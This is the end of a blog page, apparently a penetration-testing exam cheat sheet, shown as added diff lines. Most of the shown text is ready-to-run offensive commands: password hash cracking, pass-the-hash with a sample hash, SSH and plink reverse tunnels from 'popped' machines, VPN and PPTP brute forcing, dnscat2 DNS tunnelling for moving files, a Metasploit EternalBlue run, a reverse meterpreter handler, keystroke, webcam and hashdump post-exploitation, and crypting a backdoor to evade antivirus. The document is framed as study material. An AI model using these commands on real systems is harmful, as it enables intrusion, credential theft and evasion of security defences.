+<p><code>unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt</code></p>
+</li>
+</ul>
+</li>
+<li><p>John the Ripper - Password Hash Cracking</p>
+<ul>
+<li><p><code>john $ip.pwdump</code></p>
+</li>
+<li><p><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></p>
+</li>
+<li><p><code>john --rules --wordlist=/usr/share/wordlists/rockyou.txt</code></p>
+</li>
+<li><p><code>john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt</code></p>
+</li>
+<li><p>JTR forced descrypt cracking with wordlist</p>
+<p><code>john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt</code></p>
+</li>
+<li><p>JTR forced descrypt brute force cracking</p>
+<p><code>john --format=descrypt hash --show</code></p>
+</li>
+</ul>
+</li>
+<li><p>Passing the Hash in Windows</p>
+<ul>
+<li><p>Use Metasploit to exploit one of the SMB servers in the labs. Dump the password hashes and attempt a pass-the-hash attack against another system:</p>
+<p><code>export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896</code></p>
+<p><code>pth-winexe -U administrator //$ip cmd</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Networking-Pivoting-and-Tunneling"><a href="#Networking-Pivoting-and-Tunneling" class="headerlink" title="Networking, Pivoting and Tunneling"></a>Networking, Pivoting and Tunneling</h2><ul>
+<li><p>Port Forwarding - accept traffic on a given IP address and port and redirect it to a different IP address and port</p>
+<ul>
+<li><p><code>apt-get install rinetd</code></p>
+</li>
+<li><p><code>cat /etc/rinetd.conf</code></p>
+<pre><code># bindadress bindport connectaddress connectport
+w.x.y.z 53 a.b.c.d 80
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>SSH Local Port Forwarding: supports bi-directional communication channels</p>
+<ul>
+<li><code>ssh &lt;gateway&gt; -L &lt;local port to listen&gt;:&lt;remote host&gt;:&lt;remote port&gt;</code></li>
+</ul>
+</li>
+<li><p>SSH Remote Port Forwarding: Suitable for popping a remote shell on an internal non routable network</p>
+<ul>
+<li><code>ssh &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;local host&gt;:&lt;local port&gt;</code></li>
+</ul>
+</li>
+<li><p>SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local attacking box to tunnel ALL incoming traffic to ANY host in the DMZ network on ANY PORT</p>
+<ul>
+<li><code>ssh -D &lt;local proxy port&gt; -p &lt;remote port&gt; &lt;target&gt;</code></li>
+</ul>
+</li>
+<li><p>Proxychains - Perform nmap scan within a DMZ from an external computer</p>
+<ul>
+<li><p>Create reverse SSH tunnel from Popped machine on :2222</p>
+<p><code>ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com</code> <code>ssh -f -N -R 2222:&lt;local host&gt;:22 root@&lt;remote host&gt;</code></p>
+</li>
+<li><p>Create a Dynamic application-level port forward on 8080 thru 2222</p>
+<p><code>ssh -f -N -D &lt;local host&gt;:8080 -p 2222 hax0r@&lt;remote host&gt;</code></p>
+</li>
+<li><p>Leverage the SSH SOCKS server to perform Nmap scan on network using proxy chains</p>
+<p><code>proxychains nmap --top-ports=20 -sT -Pn $ip/24</code></p>
+</li>
+</ul>
+</li>
+<li><p>HTTP Tunneling</p>
+<p><code>nc -vvn $ip 8888</code></p>
+</li>
+<li><p>Traffic Encapsulation - Bypassing deep packet inspection</p>
+<ul>
+<li>http tunnel<br>On server side:<br><code>sudo hts -F &lt;server ip addr&gt;:&lt;port of your app&gt; 80</code> On client side:<br><code>sudo htc -P &lt;my proxy.com:proxy port&gt; -F &lt;port of your app&gt; &lt;server ip addr&gt;:80 stunnel</code></li>
+</ul>
+</li>
+<li><p>Tunnel Remote Desktop (RDP) from a Popped Windows machine to your network</p>
+<ul>
+<li><p>Tunnel on port 22</p>
+<p><code>plink -l root -pw pass -R 3389:&lt;localhost&gt;:3389 &lt;remote host&gt;</code></p>
+</li>
+<li><p>Port 22 blocked? Try port 80? or 443?</p>
+<p><code>plink -l root -pw 23847sd98sdf987sf98732 -R 3389:&lt;local host&gt;:3389 &lt;remote host&gt; -P80</code></p>
+</li>
+</ul>
+</li>
+<li><p>Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel (bypass deep packet inspection)</p>
+<ul>
+<li><p>Windows machine add required firewall rules without prompting the user</p>
+</li>
+<li><p><code>netsh advfirewall firewall add rule name=&quot;httptunnel_client&quot; dir=in action=allow program=&quot;httptunnel_client.exe&quot; enable=yes</code></p>
+</li>
+<li><p><code>netsh advfirewall firewall add rule name=&quot;3000&quot; dir=in action=allow protocol=TCP localport=3000</code></p>
+</li>
+<li><p><code>netsh advfirewall firewall add rule name=&quot;1080&quot; dir=in action=allow protocol=TCP localport=1080</code></p>
+</li>
+<li><p><code>netsh advfirewall firewall add rule name=&quot;1079&quot; dir=in action=allow protocol=TCP localport=1079</code></p>
+</li>
+<li><p>Start the http tunnel client</p>
+<p><code>httptunnel_client.exe</code></p>
+</li>
+<li><p>Create HTTP reverse shell by connecting to localhost port 3000</p>
+<p><code>plink -l root -pw 23847sd98sdf987sf98732 -R 3389:&lt;local host&gt;:3389 &lt;remote host&gt; -P 3000</code></p>
+</li>
+</ul>
+</li>
+<li><p>VLAN Hopping</p>
+<ul>
+<li><div class="highlight highlight-source-shell">
+
+<pre>git clone https://github.com/nccgroup/vlan-hopping.git  
+chmod 700 frogger.sh  
+./frogger.sh</pre>
+
+</div></li>
+</ul>
+</li>
+<li><p>VPN Hacking</p>
+<ul>
+<li><p>Identify VPN servers:<br><code>./udp-protocol-scanner.pl -p ike $ip</code></p>
+</li>
+<li><p>Scan a range for VPN servers:<br><code>./udp-protocol-scanner.pl -p ike -f ip.txt</code></p>
+</li>
+<li><p>Use IKEForce to enumerate or dictionary attack VPN servers:</p>
+<p><code>pip install pyip</code></p>
+<p><code>git clone https://github.com/SpiderLabs/ikeforce.git</code></p>
+<p>Perform IKE VPN enumeration with IKEForce:</p>
+<p><code>./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic</code></p>
+<p>Bruteforce IKE VPN using IKEForce:</p>
+<p><code>./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1</code> Use ike-scan to capture the PSK hash:</p>
+<div class="highlight highlight-source-shell">
+
+<pre>ike-scan  
+ike-scan TARGET-IP  
+ike-scan -A TARGET-IP  
+ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key  
+ike-scan –M –A –n example<span class="pl-cce">\_</span>group -P hash-file.txt TARGET-IP</pre>
+
+</div>
+
+<p>Use psk-crack to crack the PSK hash</p>
+<div class="highlight highlight-source-shell">
+
+<pre>psk-crack hash-file.txt  
+pskcrack  
+psk-crack -b 5 TARGET-IPkey  
+psk-crack -b 5 --charset=<span class="pl-s"><span class="pl-pds">"</span>01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<span class="pl-pds">"</span></span> 192-168-207-134key  
+psk-crack -d /path/to/dictionary-file TARGET-IP-key</pre>
+
+</div></li>
+</ul>
+</li>
+<li><p>PPTP Hacking</p>
+<ul>
+<li><p>Identifying PPTP, it listens on TCP: 1723<br>NMAP PPTP Fingerprint:</p>
+<p><code>nmap –Pn -sV -p 1723 TARGET(S)</code> PPTP Dictionary Attack</p>
+<p><code>thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst</code></p>
+</li>
+</ul>
+</li>
+<li><p>Port Forwarding&#x2F;Redirection</p>
+</li>
+<li><p>PuTTY Link tunnel - SSH Tunneling</p>
+<ul>
+<li><p>Forward remote port to local address:</p>
+<p><code>plink.exe -P 22 -l root -pw &quot;1337&quot; -R 445:&lt;local host&gt;:445 &lt;remote host&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><p>SSH Pivoting</p>
+<ul>
+<li><p>SSH pivoting from one network to another:</p>
+<p><code>ssh -D &lt;local host&gt;:1010 -p 22 user@&lt;remote host&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><p>DNS Tunneling</p>
+<ul>
+<li><p>dnscat2 supports “download” and “upload” commands for getting iles (data and programs) to and from the target machine.</p>
+</li>
+<li><p>Attacking Machine Installation:</p>
+<div class="highlight highlight-source-shell">
+
+<pre>apt-get update  
+apt-get -y install ruby-dev git make g++  
+gem install bundler  
+git clone https://github.com/iagox86/dnscat2.git  
+<span class="pl-c1">cd</span> dnscat2/server  
+bundle install</pre>
+
+</div>
+</li>
+<li><p>Run dnscat2:</p>
+<pre><code>ruby ./dnscat2.rb  
+dnscat2&gt; New session established: 1422  
+dnscat2&gt; session -i 1422
+</code></pre>
+</li>
+<li><p>Target Machine:<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://downloads.skullsecurity.org/dnscat2/"><em>https://downloads.skullsecurity.org/dnscat2/</em></a></p>
+<p><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/lukebaggett/dnscat2-powershell/"><em>https://github.com/lukebaggett/dnscat2-powershell/</em></a></p>
+<p><code>dnscat --host &lt;dnscat server ip&gt;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="The-Metasploit-Framework"><a href="#The-Metasploit-Framework" class="headerlink" title="The Metasploit Framework"></a>The Metasploit Framework</h2><ul>
+<li><p>See <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://www.offensive-security.com/metasploit-unleashed/"><em>Metasploit Unleashed Course</em></a> in the Essentials</p>
+</li>
+<li><p>Search for exploits using Metasploit GitHub framework source code:<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://github.com/rapid7/metasploit-framework"><em>https://github.com/rapid7/metasploit-framework</em></a><br>Translate them for use on LAB or EXAM.</p>
+</li>
+<li><p>Metasploit</p>
+<ul>
+<li><p>MetaSploit requires Postfresql</p>
+<p><code>systemctl start postgresql</code></p>
+</li>
+<li><p>To enable Postgresql on startup</p>
+<p><code>systemctl enable postgresql</code></p>
+</li>
+</ul>
+</li>
+<li><p>MSF Syntax</p>
+<ul>
+<li><p>Start metasploit</p>
+<p><code>msfconsole</code></p>
+<p><code>msfconsole -q</code></p>
+</li>
+<li><p>Show help for command</p>
+<p><code>show -h</code></p>
+</li>
+<li><p>Show Auxiliary modules</p>
+<p><code>show auxiliary</code></p>
+</li>
+<li><p>Use a module</p>
+<pre><code>use auxiliary/scanner/snmp/snmp_enum  
+use auxiliary/scanner/http/webdav_scanner  
+use auxiliary/scanner/smb/smb_version  
+use auxiliary/scanner/ftp/ftp_login  
+use exploit/windows/pop3/seattlelab_pass
+</code></pre>
+</li>
+<li><p>Show the basic information for a module</p>
+<p><code>info</code></p>
+</li>
+<li><p>Show the configuration parameters for a module</p>
+<p><code>show options</code></p>
+</li>
+<li><p>Set options for a module</p>
+<pre><code>set RHOSTS 192.168.1.1-254  
+set THREADS 10
+</code></pre>
+</li>
+<li><p>Run the module</p>
+<p><code>run</code></p>
+</li>
+<li><p>Execute an Exploit</p>
+<p><code>exploit</code></p>
+</li>
+<li><p>Search for a module</p>
+<p><code>search type:auxiliary login</code></p>
+</li>
+</ul>
+</li>
+<li><p>Metasploit Database Access</p>
+<ul>
+<li><p>Show all hosts discovered in the MSF database</p>
+<p><code>hosts</code></p>
+</li>
+<li><p>Scan for hosts and store them in the MSF database</p>
+<p><code>db_nmap</code></p>
+</li>
+<li><p>Search machines for specific ports in MSF database</p>
+<p><code>services -p 443</code></p>
+</li>
+<li><p>Leverage MSF database to scan SMB ports (auto-completed rhosts)</p>
+<p><code>services -p 443 --rhosts</code></p>
+</li>
+</ul>
+</li>
+<li><p>Staged and Non-staged</p>
+<ul>
+<li><p>Non-staged payload - is a payload that is sent in its entirety in one go</p>
+</li>
+<li><p>Staged - sent in two parts Not have enough buffer space Or need to bypass antivirus</p>
+</li>
+</ul>
+</li>
+<li><p>MS 17-010 - EternalBlue</p>
+<ul>
+<li>You may find some boxes that are vulnerable to MS17-010 (AKA. EternalBlue). Although, not offically part of the indended course, this exploit can be leveraged to gain SYSTEM level access to a Windows box. I have never had much luck using the built in Metasploit EternalBlue module. I found that the elevenpaths version works much more relabily. Here are the instructions to install it taken from the following YouTube video: <a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://www.youtube.com/watch?v=4OHLor9VaRI"><em>https://www.youtube.com/watch?v=4OHLor9VaRI</em></a></li>
+</ul>
+<ol>
+<li><p>First step is to configure the Kali to work with wine 32bit</p>
+<p>dpkg –add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 rm -r ~&#x2F;.wine wine cmd.exe exit</p>
+</li>
+<li><p>Download the exploit repostory <code>https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</code></p>
+</li>
+<li><p>Move the exploit to <code>/usr/share/metasploit-framework/modules/exploits/windows/smb</code> or <code>~/.msf4/modules/exploits/windows/smb</code></p>
+</li>
+<li><p>Start metasploit console</p>
+</li>
+</ol>
+<ul>
+<li><p>I found that using spoolsv.exe as the PROCESSINJECT yielded results on boxes.</p>
+<p>use exploit&#x2F;windows&#x2F;smb&#x2F;eternalblue_doublepulsar<br>msf exploit(eternalblue_doublepulsar) &gt; set RHOST 10.10.10.10<br>RHOST &#x3D;&gt; 10.10.10.10<br>msf exploit(eternalblue_doublepulsar) &gt; set PROCESSINJECT spoolsv.exe<br>PROCESSINJECT &#x3D;&gt; spoolsv.exe<br>msf exploit(eternalblue_doublepulsar) &gt; run</p>
+</li>
+</ul>
+</li>
+<li><p>Experimenting with Meterpreter</p>
+<ul>
+<li><p>Get system information from Meterpreter Shell</p>
+<p><code>sysinfo</code></p>
+</li>
+<li><p>Get user id from Meterpreter Shell</p>
+<p><code>getuid</code></p>
+</li>
+<li><p>Search for a file</p>
+<p><code>search -f *pass*.txt</code></p>
+</li>
+<li><p>Upload a file</p>
+<p><code>upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec</code></p>
+</li>
+<li><p>Download a file</p>
+<p><code>download c:\\Windows\\system32\\calc.exe /tmp/calc.exe</code></p>
+</li>
+<li><p>Invoke a command shell from Meterpreter Shell</p>
+<p><code>shell</code></p>
+</li>
+<li><p>Exit the meterpreter shell</p>
+<p><code>exit</code></p>
+</li>
+</ul>
+</li>
+<li><p>Metasploit Exploit Multi Handler</p>
+<ul>
+<li><p>multi&#x2F;handler to accept an incoming reverse_https_meterpreter</p>
+<pre><code>payload  
+use exploit/multi/handler  
+set PAYLOAD windows/meterpreter/reverse_https  
+set LHOST $ip  
+set LPORT 443  
+exploit  
+[*] Started HTTPS reverse handler on https://$ip:443/
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>Building Your Own MSF Module</p>
+<ul>
+<li><div class="highlight highlight-source-shell">
+
+<pre>mkdir -p <span class="pl-k">~</span>/.msf4/modules/exploits/linux/misc  
+<span class="pl-c1">cd</span> <span class="pl-k">~</span>/.msf4/modules/exploits/linux/misc  
+cp /usr/share/metasploitframework/modules/exploits/linux/misc/gld<span class="pl-cce">\_</span>postfix.rb ./crossfire.rb  
+nano crossfire.rb</pre>
+
+</div></li>
+</ul>
+</li>
+<li><p>Post Exploitation with Metasploit - (available options depend on OS and Meterpreter Cababilities)</p>
+<ul>
+<li><code>download</code> Download a file or directory<br><code>upload</code> Upload a file or directory<br><code>portfwd</code> Forward a local port to a remote service<br><code>route</code> View and modify the routing table<br><code>keyscan_start</code> Start capturing keystrokes<br><code>keyscan_stop</code> Stop capturing keystrokes<br><code>screenshot</code> Grab a screenshot of the interactive desktop<br><code>record_mic</code> Record audio from the default microphone for X seconds<br><code>webcam_snap</code> Take a snapshot from the specified webcam<br><code>getsystem</code> Attempt to elevate your privilege to that of local system.<br><code>hashdump</code> Dumps the contents of the SAM database</li>
+</ul>
+</li>
+<li><p>Meterpreter Post Exploitation Features</p>
+<ul>
+<li><p>Create a Meterpreter background session</p>
+<p><code>background</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Bypassing-Antivirus-Software"><a href="#Bypassing-Antivirus-Software" class="headerlink" title="Bypassing Antivirus Software"></a>Bypassing Antivirus Software</h2><ul>
+<li><p>Crypting Known Malware with Software Protectors</p>
+<ul>
+<li><p>One such open source crypter, called Hyperion</p>
+<div class="highlight highlight-source-shell">
+
+<pre>cp /usr/share/windows-binaries/Hyperion-1.0.zip  
+unzip Hyperion-1.0.zip  
+<span class="pl-c1">cd</span> Hyperion-1.0/  
+i686-w64-mingw32-g++ Src/Crypter/<span class="pl-k">*</span>.cpp -o hyperion.exe  
+cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll <span class="pl-c1">.</span>  
+cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll <span class="pl-c1">.</span>  
+wine hyperion.exe ../backdoor.exe ../crypted.exe</pre>
+
+</div></li>
+</ul>
+</li>
+</ul>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              1111-11-11 11:11:11
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali-Linux"><span class="toc-text">Kali Linux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Information-Gathering-amp-Vulnerability-Scanning"><span class="toc-text">Information Gathering &amp; Vulnerability Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Passive-Information-Gathering"><span class="toc-text">Passive Information Gathering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-Information-Gathering"><span class="toc-text">Active Information Gathering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Port-Scanning"><span class="toc-text">Port Scanning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration"><span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Enumeration"><span class="toc-text">HTTP Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Overflows-and-Exploits"><span class="toc-text">Buffer Overflows and Exploits</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shells"><span class="toc-text">Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Payloads"><span class="toc-text">Web Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scripting-Payloads"><span class="toc-text">Scripting Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode"><span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Handlers"><span class="toc-text">Handlers</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Transfers"><span class="toc-text">File Transfers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Packing-Files"><span class="toc-text">Packing Files</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Privilege-Escalation"><span class="toc-text">Linux Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Handy-Kernel-Exploits"><span class="toc-text">Handy Kernel Exploits</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Privilege-Escalation"><span class="toc-text">Windows Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-Web-and-Password-Attacks"><span class="toc-text">Client, Web and Password Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Client-Attacks"><span class="toc-text">Client Attacks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Attacks"><span class="toc-text">Web Attacks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion-Vulnerabilities"><span class="toc-text">File Inclusion Vulnerabilities</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Database-Vulnerabilities"><span class="toc-text">Database Vulnerabilities</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Attacks"><span class="toc-text">Password Attacks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Hash-Attacks"><span class="toc-text">Password Hash Attacks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Networking-Pivoting-and-Tunneling"><span class="toc-text">Networking, Pivoting and Tunneling</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Metasploit-Framework"><span class="toc-text">The Metasploit Framework</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-Antivirus-Software"><span class="toc-text">Bypassing Antivirus Software</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/kagehayashi">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/kagehayashi">Copyright © 2023 KageHayashi</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        ▰▰▰
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + survival-guide + '&url=' + http%3A%2F%2Fexample.com%2Fsurvival-guide%2Findex.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/survival-guide/index.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
